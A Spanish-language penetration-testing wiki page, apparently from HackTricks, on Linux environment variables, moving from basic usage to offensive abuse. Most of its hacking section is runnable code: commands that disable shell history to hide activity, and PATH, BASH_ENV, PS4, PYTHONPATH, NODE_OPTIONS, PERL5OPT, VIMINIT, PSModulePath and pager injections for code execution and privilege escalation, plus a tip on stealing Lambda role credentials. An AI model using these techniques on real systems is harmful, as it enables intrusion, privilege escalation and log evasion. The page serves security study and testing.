# Variables de entorno de Linux

{{#include ../../banners/hacktricks-training.md}}

## Variables globales

Las variables globales **serán** heredadas por los **procesos hijos**.

Puedes crear una variable global para tu sesión actual ejecutando:
```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```
Esta variable estará disponible para tus sesiones actuales y sus procesos secundarios.

Puedes **eliminar** una variable haciendo:
```bash
unset MYGLOBAL
```
## Variables locales

Las **variables locales** solo pueden ser **accedidas** por el **shell/script actual**.
```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```
## Lista de variables actuales
```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```
El contenido de `/proc/*/environ` está separado por **NUL**, por lo que estas variantes suelen ser más fáciles de leer:
```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```
Si buscas **credenciales** o una **configuración de servicios interesante** dentro de entornos heredados, consulta también [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md).

## Variables comunes

De: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/).<sup>[[5]](#references)</sup>

- **DISPLAY** – la pantalla utilizada por **X**. Esta variable normalmente se establece en **:0.0**, lo que significa la primera pantalla del equipo actual.
- **EDITOR** – el editor de texto preferido por el usuario.
- **HISTFILESIZE** – el número máximo de líneas contenidas en el archivo de history.
- **HISTSIZE** – número de líneas añadidas al archivo de history cuando el usuario finaliza su sesión.
- **HOME** – tu directorio de inicio.
- **HOSTNAME** – el hostname del equipo.
- **LANG** – tu idioma actual.
- **MAIL** – la ubicación del spool de correo del usuario. Normalmente **/var/spool/mail/USER**.
- **MANPATH** – la lista de directorios donde buscar páginas de manual.
- **OSTYPE** – el tipo de sistema operativo.
- **PS1** – el prompt predeterminado en bash.
- **PATH** – almacena la ruta de todos los directorios que contienen archivos binarios que quieres ejecutar especificando únicamente el nombre del archivo, en lugar de usar una ruta relativa o absoluta.
- **PWD** – el directorio de trabajo actual.
- **SHELL** – la ruta al command shell actual (por ejemplo, **/bin/bash**).
- **TERM** – el tipo de terminal actual (por ejemplo, **xterm**).
- **TZ** – tu zona horaria.
- **USER** – tu nombre de usuario actual.

## Variables interesantes para hacking

No todas las variables son igual de útiles. Desde una perspectiva ofensiva, prioriza las variables que cambian **search paths**, **startup files**, el **dynamic linker behavior** o la **audit/logging**.

### **HISTFILESIZE**

Cambia el **valor de esta variable a 0**, de modo que cuando **finalices tu sesión**, el **archivo de history** (\~/.bash_history) quede **truncado a 0 líneas**.
```bash
export HISTFILESIZE=0
```
### **HISTSIZE**

Cambia el **valor de esta variable a 0**, para que los comandos **no se conserven en el historial en memoria** ni se escriban de nuevo en el **archivo de historial** (\~/.bash_history).
```bash
export HISTSIZE=0
```
### **HISTCONTROL**

Si el **valor de esta variable está establecido en `ignorespace` o `ignoreboth`**, cualquier comando precedido por un espacio adicional no se guardará en el historial.
```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```
### **HISTFILE**

Apunta el **archivo de historial** a **`/dev/null`** o desactívalo por completo. Esto suele ser más fiable que cambiar únicamente el tamaño del historial.
```bash
export HISTFILE=/dev/null
unset HISTFILE
```
### http_proxy & https_proxy

Los procesos usarán el **proxy** declarado aquí para conectarse a Internet mediante **http o https**.
```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```
### all_proxy y no_proxy

- `all_proxy`: proxy predeterminado para herramientas/protocolos que lo admiten.
- `no_proxy`: lista de exclusión (hosts/dominios/CIDR) que deben conectarse directamente.
```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```
Se pueden utilizar variantes en minúsculas y mayúsculas según la herramienta (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE y SSL_CERT_DIR

Los procesos confiarán en los certificados indicados en **estas variables de entorno**. Esto resulta útil para hacer que herramientas como **`curl`**, **`git`**, los clientes HTTP de Python o los gestores de paquetes confíen en una CA controlada por el atacante (por ejemplo, para hacer que un proxy de interceptación parezca legítimo).
```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```
### **PATH**

Si un wrapper/script privilegiado ejecuta comandos **sin rutas absolutas**, gana el **primer directorio controlado por el atacante** en `PATH`. Este es el primitive detrás de muchos **PATH hijacks** en `sudo`, trabajos de cron, shell wrappers y helpers SUID personalizados. Busca `env_keep+=PATH`, un `secure_path` débil o wrappers que llamen a `tar`, `service`, `cp`, `python`, etc. por nombre.
```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```
Para consultar cadenas completas de privilege escalation que abusan de `PATH`, revisa [Linux Privilege Escalation](linux-privilege-escalation/README.md).

### **HOME & XDG_CONFIG_HOME**

`HOME` no es solo una referencia a un directorio: muchas herramientas cargan automáticamente **dotfiles**, **plugins** y **configuración por usuario** desde `$HOME` o `$XDG_CONFIG_HOME`. Si un flujo de trabajo privilegiado conserva estos valores, la **config injection** puede ser más sencilla que el binary hijacking.
```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```
Los objetivos interesantes incluyen `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py` y archivos específicos de herramientas como `.terraformrc`.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

Estas variables influyen en el **dynamic linker**:

- `LD_PRELOAD`: fuerza la carga previa de objetos compartidos adicionales.
- `LD_LIBRARY_PATH`: antepone directorios de búsqueda de bibliotecas.
- `LD_AUDIT`: carga bibliotecas auditoras que observan la carga de bibliotecas y la resolución de símbolos.

Son extremadamente valiosas para **hooking**, **instrumentation** y **privilege escalation** si un comando privilegiado las conserva. En el modo de **secure-execution** (`AT_SECURE`, por ejemplo, setuid/setgid/capabilities), el loader elimina o restringe muchas de estas variables. Sin embargo, los parser bugs en esa etapa temprana del loader siguen teniendo un gran impacto porque se ejecutan **antes** que el programa objetivo.<sup>[[2]](#references)</sup>
```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```
### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` modifica el comportamiento temprano de glibc (por ejemplo, los tunables del allocator) y resulta muy útil en laboratorios de exploit. También es importante desde una perspectiva de seguridad porque el **dynamic loader lo analiza muy temprano**. El bug **Looney Tunables** de 2023 fue un buen recordatorio de que una sola variable de entorno analizada por el loader puede convertirse en una **primitiva de escalada de privilegios local** contra programas SUID.<sup>[[6]](#references)</sup>
```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```
### **BASH_ENV & ENV**

Si **Bash** se inicia de forma **no interactiva**, comprueba `BASH_ENV` y hace source de ese archivo antes de ejecutar el script objetivo. Cuando Bash se invoca como `sh`, o en modo interactivo de estilo POSIX, también puede consultarse `ENV`. Esta es una forma clásica de convertir un shell wrapper en ejecución de código si el entorno está controlado por el atacante.
```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```
Bash ignora estos archivos de inicio cuando los **IDs real/efectivo difieren**; `-p` conserva el ID efectivo, pero no habilita esos archivos de inicio, por lo que el comportamiento exacto depende de cómo el wrapper invoque el shell. Ten cuidado con los wrappers privilegiados que llaman a `setuid()`/`setgid()` **antes** de iniciar Bash: una vez que los IDs vuelven a coincidir, Bash puede confiar en `BASH_ENV`, `ENV` y el estado relacionado del shell que, de otro modo, ignoraría.<sup>[[1]](#references)</sup>

### **PS4 + SHELLOPTS (xtrace)**

Cuando Bash se ejecuta con **xtrace** habilitado, expande `PS4` y lo imprime antes de cada comando rastreado. `PS4` se expande como un prompt, por lo que una **sustitución de comandos** dentro de él se ejecuta. Lo crucial es que xtrace puede habilitarse únicamente desde el entorno exportando `SHELLOPTS=xtrace` —no se necesita `-x` en la línea de comandos—, de modo que cualquier script de Bash que ejecute la víctima se convierte en code execution.<sup>[[7]](#references)</sup>
```bash
echo 'echo target' > /tmp/victim.sh

# Pure environment-variable injection (no -x flag)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a job is run with debugging enabled
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```
`PS4` no hace nada hasta que xtrace está activo (`SHELLOPTS=xtrace`, `set -x` o `bash -x`), y Bash elimina `SHELLOPTS` en contextos privilegiados/setuid igual que `BASH_ENV`.

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP, PYTHONINSPECT y PYTHONBREAKPOINT**

Estas variables cambian la forma en que Python se inicia:

- `PYTHONPATH`: antepone rutas de búsqueda de importación.
- `PYTHONHOME`: reubica el árbol de la biblioteca estándar.
- `PYTHONSTARTUP`: ejecuta un archivo antes del prompt interactivo.
- `PYTHONINSPECT=1`: entra en modo interactivo después de que finaliza un script.
- `PYTHONBREAKPOINT`: invoca `package.module.callable` (e importa su módulo) cuando el código llega a `breakpoint()`.<sup>[[8]](#references)</sup>

Son útiles contra scripts de mantenimiento, debuggers, shells y wrappers que ejecutan Python con un entorno controlable. `python -E` y `python -I` ignoran todas las variables `PYTHON*`.
```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode

# PYTHONBREAKPOINT: runs when the target reaches breakpoint()
printf 'import sys\nbreakpoint(*sys.argv[1:])\n' > /tmp/bp.py
PYTHONBREAKPOINT='os.system' python3 /tmp/bp.py 'id'   # requires the code to hit breakpoint()
```
Un ejemplo reciente del mundo real fue el LPE de **needrestart** de 2024 en sistemas Ubuntu/Debian: el scanner propiedad de root copiaba el `PYTHONPATH` de un proceso sin privilegios desde `/proc/<PID>/environ` y luego ejecutaba Python. El exploit publicado colocaba `importlib/__init__.so` en la ruta controlada por el atacante, de modo que Python ejecutaba el código del atacante durante su propia inicialización, antes de que el script codificado directamente en el helper siquiera importara.<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perl tiene variables de inicio igualmente útiles:

- `PERL5LIB`: antepone directorios de libraries.
- `PERL5OPT`: inyecta switches como si estuvieran en cada línea de comandos de `perl`.

Esto puede forzar la **carga automática de módulos** o cambiar el comportamiento del intérprete antes de que el script objetivo haga algo interesante. Perl ignora estas variables en contextos de **taint / setuid / setgid**, pero siguen siendo muy relevantes para wrappers ejecutados normalmente como root, trabajos de CI, installers y reglas personalizadas de sudoers.
```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```
### **NODE_OPTIONS**

`NODE_OPTIONS` antepone **Node.js CLI flags** a cada proceso `node` que herede el entorno. Esto lo hace útil contra wrappers, trabajos de CI, helpers de Electron y reglas de sudo que finalmente ejecutan Node. Los flags más interesantes desde el punto de vista ofensivo suelen ser:

- `--require <file>`: precarga un archivo CommonJS antes del script objetivo.
- `--import <module>`: precarga un módulo ES antes del script objetivo.

Node rechaza algunos flags peligrosos en `NODE_OPTIONS`, pero `--require` y `--import` están permitidos explícitamente y se procesan **antes** de los argumentos normales de la línea de comandos.<sup>[[4]](#references)</sup>
```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```
#### Preload sin archivos con una URL `data:`

Cuando puedes establecer `NODE_OPTIONS` pero **no puedes escribir un archivo** en el objetivo (sistema de archivos de solo lectura, API restringida, runtime serverless, etc.), `--import` acepta una URL `data:text/javascript,`, por lo que todo el payload viaja dentro de la propia variable de entorno. El JavaScript debe estar **completamente codificado en URL** — Node analiza el valor como una URL, por lo que cualquier espacio sin codificar (u otro carácter sin codificar) trunca el payload y lanza un `SyntaxError`. Esto funciona en Node 20.6+, donde `--import` está en la allowlist de `NODE_OPTIONS`.<sup>[[4]](#references)</sup>
```bash
# fileless proof of execution (note: no raw spaces in the data URL)
NODE_OPTIONS='--import data:text/javascript,console.log(%22fileless_preload%22)' node -e 'console.log("target")'

# Real payload, URL-encoded (run a command / exfiltrate env vars)
PAYLOAD=$(python3 - <<'PY'
import urllib.parse
js = "import('child_process').then(cp=>console.log(cp.execSync('id').toString()))"
print("--import data:text/javascript," + urllib.parse.quote(js, safe=""))
PY
)
NODE_OPTIONS="$PAYLOAD" node -e 'console.log("target")'
```
> [!TIP]
> Esta es una forma común de convertir el control de `NODE_OPTIONS` en RCE en **managed cloud runtimes** cuyas funciones ejecutan Node. Por ejemplo, un atacante que solo pueda cambiar la configuración de una Lambda (`lambda:UpdateFunctionConfiguration`, sin `iam:PassRole` ni actualización del código) puede inyectar `NODE_OPTIONS=--import data:text/javascript,<payload>` para ejecutar código dentro de la función y robar las credenciales de su execution role. El módulo inyectado se ejecuta **antes** que el handler, que después continúa ejecutándose normalmente.

Para cadenas de gadgets remotas que establecen `NODE_OPTIONS` indirectamente (por ejemplo, mediante prototype-pollution para lograr RCE), consulta [esta otra página](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md).

### **RUBYLIB & RUBYOPT**

Ruby ofrece la misma clase de abuso durante el inicio:

- `RUBYLIB`: antepone directorios al load path de Ruby.
- `RUBYOPT`: inyecta opciones de línea de comandos como `-r` en cada invocación de `ruby`.
```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```
Las vulnerabilidades de **needrestart** de 2024 demostraron que esto no es solo un truco de laboratorio: el mismo helper propiedad de root vulnerable al abuso de `PYTHONPATH` también podía ser obligado a ejecutar Ruby con un `RUBYLIB` controlado por el atacante, cargando `enc/encdb.so` desde un directorio del atacante.<sup>[[3]](#references)</sup>

### **VIMINIT & EXINIT**

Vim/Neovim ejecutan los comandos Ex contenidos en `VIMINIT` (o en su fallback `EXINIT`) durante un inicio normal. Los comandos Ex incluyen `:!cmd` y `:call system(...)`, por lo que controlar la variable permite la ejecución de código cada vez que una víctima abre Vim (un `sudo vim` como root, `crontab -e`, `visudo`, `git`/`less` iniciando `$EDITOR`, etc.).<sup>[[9]](#references)</sup>
```bash
echo hi > /tmp/victim.txt
printf ':qa!\n' | VIMINIT='silent! !touch /tmp/vim-executed' vim /tmp/victim.txt
test -e /tmp/vim-executed && echo 'VIMINIT executed'
```
El modo por lotes (`vim -es`/`-Es`) omite estas variables, pero un inicio interactivo normal las ejecuta.

### **PowerShell (pwsh): PSModulePath, DOTNET_STARTUP_HOOKS y CLR profiler**

PowerShell Core (`pwsh`) se ejecuta en Linux/macOS (y Windows) y es una **aplicación .NET**, por lo que varias variables de entorno convierten cualquier invocación de `pwsh` con un entorno heredado en ejecución de código —útil contra trabajos de cron/systemd, CI runners y wrappers privilegiados que ejecutan comandos mediante shell en `pwsh`.

- `PSModulePath`: PowerShell busca recursivamente en cada directorio de esta lista módulos `.psd1`/`.psm1` y **carga automáticamente** uno la primera vez que se referencia un comando que exporta. Anteponer un directorio hace que el código de nivel superior de tu módulo se ejecute en el momento de la importación; como la resolución sigue el orden *Alias → Function → Cmdlet*, una función exportada incluso puede suplantar un cmdlet integrado que la víctima invoque.<sup>[[10]](#references)</sup>
- `XDG_CONFIG_HOME`: reubica `powershell/Microsoft.PowerShell_profile.ps1`, que se ejecuta durante el inicio (salvo con `-NoProfile`).
- `DOTNET_STARTUP_HOOKS`: ensamblado administrado cuyo `StartupHook.Initialize()` se ejecuta antes de `Main` (compartido por todas las aplicaciones .NET).
- `CORECLR_ENABLE_PROFILING=1` + `CORECLR_PROFILER={guid}` + `CORECLR_PROFILER_PATH=/path/evil.so`: la API de profiling del CLR carga una biblioteca del atacante en el proceso durante el inicio (las variables de ruta tienen prioridad sobre el registro; `DOTNET_*` es el alias más reciente). En Windows PowerShell 5.1 (.NET Framework), usa `COR_ENABLE_PROFILING`/`COR_PROFILER`/`COR_PROFILER_PATH`. MITRE ATT&CK T1574.012.<sup>[[11]](#references)</sup>
```bash
# PSModulePath module auto-load hijack
mkdir -p /tmp/evil/Hijack
printf 'New-Item -ItemType File /tmp/ps-mod-exec -Force|Out-Null\nfunction Invoke-Report{}\nExport-ModuleMember -Function Invoke-Report\n' > /tmp/evil/Hijack/Hijack.psm1
printf "@{ModuleVersion='1.0';RootModule='Hijack.psm1';FunctionsToExport=@('Invoke-Report')}\n" > /tmp/evil/Hijack/Hijack.psd1
PSModulePath="/tmp/evil:$PSModulePath" pwsh -Command 'Invoke-Report'
test -e /tmp/ps-mod-exec && echo 'PSModulePath auto-load executed'
```
En Windows, `PSExecutionPolicyPreference=Bypass` además elimina la protección que bloquea los "scripts sin firmar", por lo que un profile/module colocado realmente se ejecuta. Consulta la página específica para ver los PoCs completos:

{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-powershell-applications-injection.md
{{#endref}}

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

Algunas herramientas no solo leen una ruta desde el entorno; pasan el valor a un **shell**, un **editor** o un **preprocesador de entrada**. Esto hace que las siguientes variables sean especialmente interesantes cuando un wrapper privilegiado ejecuta `git`, `man`, `less` u otros visores de texto similares:

- `PAGER`, `MANPAGER`, `GIT_PAGER`: eligen el comando del pager.
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: eligen el comando del editor, normalmente con argumentos.
- `LESSOPEN`, `LESSCLOSE`: definen preprocesadores y postprocesadores que se ejecutan cuando `less` abre un archivo.
```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```
Git también admite la **inyección de configuración solo mediante variables de entorno** sin tocar el disco mediante `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>` y `GIT_CONFIG_VALUE_<n>`:
```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```
Desde una perspectiva de post-exploitation, recuerda también que los entornos heredados suelen contener **credenciales**, **configuraciones de proxy**, **service tokens** o **cloud keys**. Consulta [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md) para buscar en `/proc/<PID>/environ` y en `Environment=` de `systemd`.

### PS1

Cambia el aspecto de tu prompt.

[**Este es un ejemplo**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: Este es un ejemplo](<../images/image (897).png>)

Usuario normal:

![PERL5OPT & PERL5LIB - PS1: Uno, dos y tres trabajos ejecutados en segundo plano](<../images/image (740).png>)

Uno, dos y tres trabajos ejecutados en segundo plano:

![PERL5OPT & PERL5LIB - PS1: Uno, dos y tres trabajos ejecutados en segundo plano](<../images/image (145).png>)

Un trabajo en segundo plano, uno detenido y el último comando no terminó correctamente:

![PERL5OPT & PERL5LIB - PS1: Un trabajo en segundo plano, uno detenido y el último comando no terminó correctamente](<../images/image (715).png>)

## References

- [1] [Manual de GNU Bash - Archivos de inicio de Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - Página del manual de Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - LPEs en needrestart](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Documentación de la CLI de Node.js - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [Variables de entorno comunes - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911: Looney Tunables - Escalada de privilegios local en el ld.so de glibc - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
- [7] [Manual de GNU Bash - Variables de Bash (`PS4`) y el builtin Set (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [8] [PEP 553 - breakpoint() integrado y PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [9] [Documentación de Vim - starting.txt (`VIMINIT`, `EXINIT`)](https://vimhelp.org/starting.txt.html#initialization)
- [10] [about_PSModulePath y autocarga de módulos de PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
- [11] [Configuración de depuración y profiling de .NET (variables de profiler `CORECLR_`/`DOTNET_`/`COR_`)](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
{{#include ../../banners/hacktricks-training.md}}
